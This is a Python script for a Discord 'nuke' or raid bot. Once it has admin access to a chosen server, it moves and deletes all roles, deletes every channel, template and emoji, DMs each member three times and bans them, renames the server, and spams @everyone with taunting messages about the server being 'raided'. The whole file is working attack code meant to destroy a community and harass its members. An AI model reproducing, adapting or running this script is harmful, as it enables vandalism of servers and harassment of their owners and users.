from discord.ext import commands
import discord
import os
import json

if not os.path.exists("tokens.json"):
    with open("tokens.json", "w") as file:
        json.dump({}, file)

with open("tokens.json", "r") as file:
    tokens = json.load(file)

if os.name == "nt": os.system("cls")
else: os.system("clear")

print("Choose a token from the list, 'new' to add a new token,\nor 'custom' to enter a custom token")
print("--------------------")
for i, token in enumerate(tokens):
    print(f"{i}: {token}")
print("--------------------")
token = input("Choose a token: ")
if token == "new":
    name = input("Enter the name of the token: ")
    token = input("Enter the token: ")
    tokens[name] = token
    with open("tokens.json", "w") as file:
        json.dump(tokens, file, indent=4)
elif token == "custom":
    token = input("Enter the token: ")
else:
    for i, key in enumerate(tokens):
        if token == str(i):
            token = tokens[key]
            break

if os.name == "nt": os.system("cls")
else: os.system("clear")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

messagechannel = "@everyone DEVV THE SIGMA ALPHA FURRY RAIDED THE SERVER, L BOZOS 🤣🤣🤣🤣🤣🤣🤣🤣🤣🤣😂😂😂😂😂😂😹😹😹😹😹"
messagedm = "THE RATTERZ COMMUNITY GOT RAIDED BY DEVV"
nameserver = "dev-on-top"

@bot.event
async def on_ready():
    print("Logged in as", bot.user, "(" + str(bot.user.id) + ")")
    print("Invite Link: https://discord.com/oauth2/authorize?client_id=" + str(bot.user.id) + "&permissions=8&integration_type=0&scope=bot+applications.commands")
    print("-------------------------------")
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="commands"))
    for i, guild in enumerate(bot.guilds):
        try:
            invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0, unique=True)
        except Exception as e:
            invite = "No Invite"
        if invite != "No Invite":
            invite = invite.url
        print(f"{i}: {guild.name} - {guild.member_count} - {invite}")
    print("-------------------------------")
    inp = input("Enter the guild number: ")
    guild = bot.guilds[int(inp)]

    for role in guild.roles:
        try:
            await role.edit(position=0)
            print(f"       Moved role {role.name}")
        except:
            pass

    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"       Deleted channel {channel.name}")
        except:
            pass
    for role in guild.roles:
        try:
            await role.delete()
            print(f"       Deleted role {role.name}")
        except:
            pass
    for member in guild.members:
        try:
            for i in range(3):
                await member.send(messagedm)
            print(f"       Sent messages to {member.name}")
        except:
            pass
    for member in guild.members:
        try:
            await member.ban()
            print(f"       Banned {member.name}")
        except:
            pass
    for template in await guild.templates():
        try:
            await template.delete()
            print(f"       Deleted template {template.name}")
        except:
            pass
    for emoji in guild.emojis:
        try:
            await emoji.delete()
            print(f"       Deleted emoji {emoji.name}")
        except:
            pass
    try:
        await guild.edit(icon=None)
        print("       Deleted guild icon")
    except:
        pass
    
    await guild.edit(name=nameserver)
    print("       Changed guild name")
    role = await guild.create_role(name="bashir on top", hoist=True, color=discord.Color.red())
    print("       Created role")
    for member in guild.members:
        try:
            await member.add_roles(role)
            print(f"       Gave role to {member.name}")
        except:
            pass
    channel = await guild.create_text_channel(name=nameserver)
    print("       Created information channel")

    category = await guild.create_category(name=nameserver)
    for letter in nameserver:
        voicechan = await guild.create_voice_channel(name=letter, category=category)
        await voicechan.send(messagechannel)
    print("       Created voice channels with nameserver")
    

    for i in range(3):
        await channel.send(messagechannel)
    print("       Sent messages in information channel")
    
    print("Done striking")
    await bot.close()        

bot.run(token)
